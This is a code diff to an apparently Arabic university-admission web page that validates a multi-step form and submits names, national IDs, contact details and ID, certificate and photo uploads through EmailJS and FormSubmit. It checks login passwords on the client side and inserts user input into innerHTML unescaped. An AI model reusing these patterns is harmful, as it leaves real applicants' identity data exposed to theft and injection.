+      ['landingBox','loginBox','successBox','step1Box','step2Box','step3Box','step4Box','requestSuccessBox']
+        .forEach(id => document.getElementById(id).classList.add('hidden'));
+    }
+
+    function showLanding() {
+      clearState();
+      hideAll();
+      document.getElementById('landingBox').classList.remove('hidden');
+      document.getElementById('stepsBox').classList.remove('hidden');
+      document.getElementById('docsBox').classList.remove('hidden');
+      document.getElementById('animatedImage').style.display = '';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function showLogin() {
+      hideAll();
+      document.getElementById('loginBox').classList.remove('hidden');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function backToLanding() {
+      clearState();
+      savedFiles.id = null;
+      savedFiles.cert = null;
+      savedFiles.photo = null;
+      requestData = {
+        fullName: "", nationalId: "", phone: "", email: "", gender: "",
+        certType: "", gradYear: "", gpa: "", firstChoice: "", secondChoice: "",
+        files: { id: null, cert: null, photo: null }
+      };
+      document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="number"]').forEach(i => i.value = '');
+      document.querySelectorAll('select').forEach(s => s.value = '');
+      document.querySelectorAll('input[type="radio"]').forEach(r => r.checked = false);
+      ['fileId','fileCert','filePhoto'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
+      ['nameId','nameCert','namePhoto'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) { el.textContent = 'لم يتم اختيار أي ملف'; el.classList.add('empty'); el.classList.remove('has-file'); }
+      });
+      showLanding();
+    }
+
     function login() {
       const user = document.getElementById('username').value.trim();
       const pass = document.getElementById('password').value.trim();
 
       if (users[user] && users[user].password === pass) {
-        // إخفاء صورة المقدمة المتحركة بعد الدخول
         document.getElementById('animatedImage').style.display = 'none';
-        document.getElementById('loginBox').classList.add('hidden');
+        hideAll();
+        document.getElementById('stepsBox').classList.add('hidden');
+        document.getElementById('docsBox').classList.add('hidden');
         document.getElementById('successBox').classList.remove('hidden');
         document.getElementById('studentNameDisplay').textContent = "الطالب: " + users[user].name;
+        window.scrollTo({ top: 0, behavior: 'smooth' });
       } else {
         alert('بيانات الدخول غير صحيحة');
       }
     }
+
+    function logout() {
+      document.getElementById('username').value = '';
+      document.getElementById('password').value = '';
+      clearState();
+      showLanding();
+    }
+
+    function startNewRequest() {
+      hideAll();
+      document.getElementById('stepsBox').classList.add('hidden');
+      document.getElementById('docsBox').classList.add('hidden');
+      document.getElementById('step1Box').classList.remove('hidden');
+      saveState();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function normalizeDigits(str) {
+      if (!str) return '';
+      return str.toString().replace(/[٠-٩]/g, d => '٠١٢٣٤٥٦٧٨٩'.indexOf(d))
+                          .replace(/[۰-۹]/g, d => '۰۱۲۳۴۵۶۷۸۹'.indexOf(d));
+    }
+
+    function validateStep1() {
+      const name = document.getElementById('fullName').value.trim();
+      const id = document.getElementById('nationalId').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const gender = document.querySelector('input[name="gender"]:checked');
+
+      if (name.length < 6) return "الرجاء إدخال الاسم الكامل (4 مقاطع على الأقل).";
+      if (!/^\d{10}$/.test(id)) return "رقم الهوية يجب أن يكون 10 أرقام.";
+
+      const normalizedPhone = normalizeDigits(phone);
+      if (!/^\d{6,14}$/.test(normalizedPhone)) {
+        return "رقم الجوال غير صحيح. يجب أن يحتوي على 6 إلى 14 رقماً.";
+      }
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return "البريد الإلكتروني غير صحيح.";
+      if (!gender) return "الرجاء اختيار الجنس.";
+      return null;
+    }
+
+    function validateStep2() {
+      const certType = document.getElementById('certType').value;
+      const gradYear = document.getElementById('gradYear').value;
+      const gpa = document.getElementById('gpa').value;
+      const firstChoice = document.getElementById('firstChoice').value;
+
+      if (!certType) return "الرجاء اختيار نوع الشهادة.";
+      if (!gradYear || gradYear < 1990 || gradYear > 2030) return "سنة التخرج غير صحيحة.";
+      if (!gpa || gpa < 50 || gpa > 100) return "النسبة يجب أن تكون بين 50 و 100.";
+      if (!firstChoice) return "الرجاء اختيار الرغبة الأولى.";
+      return null;
+    }
+
+    function validateStep3() {
+      if (!savedFiles.id) return "الرجاء رفع صورة الهوية.";
+      if (!savedFiles.cert) return "الرجاء رفع شهادة الثانوية.";
+      if (!savedFiles.photo) return "الرجاء رفع الصورة الشخصية.";
+
+      const checkFile = (file, label) => {
+        if (file.size === 0) return `${label} فارغ أو تالف.`;
+        const maxSingleSize = 5 * 1024 * 1024;
+        if (file.size > maxSingleSize) {
+          const sizeMB = (file.size / (1024*1024)).toFixed(2);
+          return `حجم ${label} كبير جداً (${sizeMB} ميجا). الحد 5 ميجا.`;
+        }
+        return null;
+      };
+
+      const errId = checkFile(savedFiles.id, 'صورة الهوية');
+      if (errId) return errId;
+      const errCert = checkFile(savedFiles.cert, 'شهادة الثانوية');
+      if (errCert) return errCert;
+      const errPhoto = checkFile(savedFiles.photo, 'الصورة الشخصية');
+      if (errPhoto) return errPhoto;
+
+      const totalSize = savedFiles.id.size + savedFiles.cert.size + savedFiles.photo.size;
+      const maxTotalSize = 9 * 1024 * 1024;
+      if (totalSize > maxTotalSize) {
+        const totalMB = (totalSize / (1024*1024)).toFixed(2);
+        return `مجموع حجم الملفات كبير جداً (${totalMB} ميجا). الحد 9 ميجا.`;
+      }
+
+      return null;
+    }
+
+    function goToStep1() {
+      hideAll();
+      document.getElementById('step1Box').classList.remove('hidden');
+      saveState();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function goToStep2() {
+      const err = validateStep1();
+      if (err) { alert(err); return; }
+
+      hideAll();
+      document.getElementById('step2Box').classList.remove('hidden');
+      saveState();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function goToStep3() {
+      const err = validateStep2();
+      if (err) { alert(err); return; }
+
+      hideAll();
+      document.getElementById('step3Box').classList.remove('hidden');
+      saveState();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function goToStep4() {
+      const err = validateStep3();
+      if (err) { alert(err); return; }
+
+      // سحب القيمة المحدثة مباشرة من الحقول في كل مرة يتم الدخول لصفحة المراجعة
+      const phoneInput = document.getElementById('phone').value.trim();
+      const countryCode = document.getElementById('countryCode').value;
+      const normalizedPhone = normalizeDigits(phoneInput);
+      const cleanPhone = normalizedPhone.replace(/^0+/, '');
+
+      requestData.fullName = document.getElementById('fullName').value.trim();
+      requestData.nationalId = document.getElementById('nationalId').value.trim();
+      requestData.phone = countryCode + cleanPhone;
+      requestData.email = document.getElementById('email').value.trim();
+      
+      const genderEl = document.querySelector('input[name="gender"]:checked');
+      requestData.gender = genderEl ? genderEl.value : '';
+
+      requestData.certType = document.getElementById('certType').value;
+      requestData.gradYear = document.getElementById('gradYear').value;
+      requestData.gpa = document.getElementById('gpa').value;
+      requestData.firstChoice = document.getElementById('firstChoice').value;
+      requestData.secondChoice = document.getElementById('secondChoice').value;
+
+      requestData.files.id = savedFiles.id.name;
+      requestData.files.cert = savedFiles.cert.name;
+      requestData.files.photo = savedFiles.photo.name;
+
+      const genderText = requestData.gender === 'male' ? 'ذكر' : (requestData.gender === 'female' ? 'أنثى' : 'غير محدد');
+      
+      document.getElementById('reviewContent').innerHTML = `
+        <div class="review-box">
+          <strong>📋 البيانات الشخصية</strong><br>
+          الاسم: ${requestData.fullName}<br>
+          رقم الهوية: ${requestData.nationalId}<br>
+          الجوال: ${requestData.phone}<br>
+          البريد: ${requestData.email}<br>
+          الجنس: ${genderText}
+        </div>
+        <div class="review-box">
+          <strong>🎓 المؤهل الدراسي</strong><br>
+          نوع الشهادة: ${requestData.certType}<br>
+          سنة التخرج: ${requestData.gradYear}<br>
+          المعدل: ${requestData.gpa}%<br>
+          الرغبة الأولى: ${requestData.firstChoice}<br>
+          الرغبة الثانية: ${requestData.secondChoice || 'لم يتم الاختيار'}
+        </div>
+        <div class="review-box">
+          <strong>📎 المستندات المرفقة</strong><br>
+          ✓ الهوية: ${requestData.files.id}<br>
+          ✓ الشهادة: ${requestData.files.cert}<br>
+          ✓ الصورة: ${requestData.files.photo}
+        </div>
+      `;
+
+      hideAll();
+      document.getElementById('step4Box').classList.remove('hidden');
+      saveState();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    async function submitRequest(event) {
+      if (event) { event.preventDefault(); event.stopPropagation(); }
+
+      const submitBtn = document.getElementById('submitBtn');
+      const overlay = document.getElementById('loadingOverlay');
+
+      submitBtn.disabled = true;
+      overlay.classList.remove('hidden');
+
+      const year = new Date().getFullYear();
+      const random = Math.floor(100000 + Math.random() * 900000);
+      const requestNumber = `KFU-${year}-${random}`;
+      const genderText = requestData.gender === 'male' ? 'ذكر' : 'أنثى';
+
+      const templateParams = {
+        fullName: requestData.fullName,
+        nationalId: requestData.nationalId,
+        phone: requestData.phone,
+        email: requestData.email,
+        gender: genderText,
+        certType: requestData.certType,
+        gradYear: requestData.gradYear,
+        gpa: requestData.gpa,
+        firstChoice: requestData.firstChoice,
+        secondChoice: requestData.secondChoice || 'لم يتم الاختيار',
+        fileId: requestData.files.id,
+        fileCert: requestData.files.cert,
+        filePhoto: requestData.files.photo,
+        requestNumber: requestNumber,
+        date: new Date().toLocaleString('ar-SA')
+      };
+
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+      } catch (error) {
+        console.warn('EmailJS: تم تخطي إرسال النص', error);
+      }
+
+      try {
+        const fd = new FormData();
+        fd.append('student_name', requestData.fullName);
+        fd.append('national_id', requestData.nationalId);
+        fd.append('phone', requestData.phone);
+        fd.append('email', requestData.email);
+        fd.append('gender', genderText);
+        fd.append('cert_type', requestData.certType);
+        fd.append('grad_year', requestData.gradYear);
+        fd.append('gpa', requestData.gpa);
+        fd.append('first_choice', requestData.firstChoice);
+        fd.append('second_choice', requestData.secondChoice || 'لم يتم الاختيار');
+        fd.append('request_number', requestNumber);
+
+        fd.append('id_card', savedFiles.id);
+        fd.append('certificate', savedFiles.cert);
+        fd.append('photo', savedFiles.photo);
+
+        await fetch(FORMSUBMIT_ENDPOINT, {
+          method: 'POST',
+          body: fd,
+          mode: 'no-cors',
+          redirect: 'manual'
+        });
+
+        document.getElementById('requestNumber').textContent = requestNumber;
+        clearState();
+        savedFiles.id = null;
+        savedFiles.cert = null;
+        savedFiles.photo = null;
+        hideAll();
+        document.getElementById('animatedImage').style.display = 'none';
+        document.getElementById('stepsBox').classList.add('hidden');
+        document.getElementById('docsBox').classList.add('hidden');
+        document.getElementById('requestSuccessBox').classList.remove('hidden');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+
+      } catch (error) {
+        console.error('FormSubmit Error:', error);
+        alert('حدث خطأ أثناء إرسال الملفات.\n\nتفاصيل: ' + error.message);
+      } finally {
+        overlay.classList.add('hidden');
+        submitBtn.disabled = false;
+      }
+    }
+
+    document.addEventListener('keypress', function(e) {
+      if (e.key === 'Enter' && !document.getElementById('loginBox').classList.contains('hidden')) {
+        login();
+      }
+    });
   </script>
 
 </body>
